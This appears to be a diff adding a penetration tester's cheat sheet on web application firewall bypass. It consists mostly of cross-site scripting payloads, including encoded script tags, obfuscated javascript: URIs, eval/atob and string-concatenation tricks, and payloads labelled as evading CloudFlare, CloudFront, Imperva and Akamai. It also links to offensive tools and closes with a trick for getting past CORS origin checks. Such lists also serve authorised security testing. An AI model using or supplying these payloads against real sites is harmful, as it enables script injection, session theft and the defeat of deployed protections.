@@ -1,0 +1,73 @@
+WAF Bypass
+
+OWASP Z-Shell-Code project
+	https://github.com/zdresearch/OWASP-ZSC
+
+IPv4 Obscurer
+	https://github.com/dagonis/obscureV4
+
+
+https://gist.github.com/hackerscrolls
+	mutations on <a> tag
+		https://gist.github.com/hackerscrolls/5c0990dfc734eeb4a9ce8cf2ccdf6fba
+	mutations on <href> tag
+		https://gist.github.com/hackerscrolls/49b0a6edf955097fa8f92ddbf2eddbc9
+
+" onfocus="alert(0)" autofocus=""
+"><svg/onload=alert(0)>
+"><iframe/src=javascript:alert(0)>
+%253Cscript%253Ealert(0)%253C%252Fscript%253E
+
+javascript: 
+	java\nscript		or \r
+	\x01javascript:		or \x00 or \x02
+	jaVAscrIpt:
+
+Skip XSS filters with CloudFlare{}; 
+<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
+
+
+Bypass an XSS filter with emoji 
+"[emoji]<<sVg/onload[emoji]=/svg/onload=svg/onmouseOver=confirm`1`><!--[emoji]//="
+
+
+in JavaScript context:
+	alert() => window['alert']()
+	alert() => this['alert']()
+	alert() => (alert)()
+	alert() => eval(atob('YWxlcnQoKQ=='))
+	document.cookie => document['cookie']
+
+concatenation
+	a=8,b=confirm,c=window,c.onerror=b;throw-a
+	onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
+
+
+Content-Type parsing
+	https://github.com/BlackFan/content-type-research/blob/master/README.md
+
+CloudFront dot shot
+	<iframe/onload='this["src"]="jav"+"as cr"+"ipt:al"+"er"+"t()"';>
+
+	<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+
+
+CloudFlare
+	<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+
+	<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'> 
+	Javascript URI cushioned between carriage returns with a non-bracketed prompt.
+
+	<img src onerror=%26emsp;prompt`${document.domain}`>
+
+
+Imperva
+	<bleh/onclick=top[/al/.source+/ert/.source] ``>click
+
+Akamai
+	<details onauxclick=confirm`xss`></details>
+	Right-Click on 'Details', XSS will be fired.
+
+CORS Protection Bypass	
+	If the system only allows "Origin: http://target.com",
+	Use a gTLD containing "com" -> Origin: http://target.community
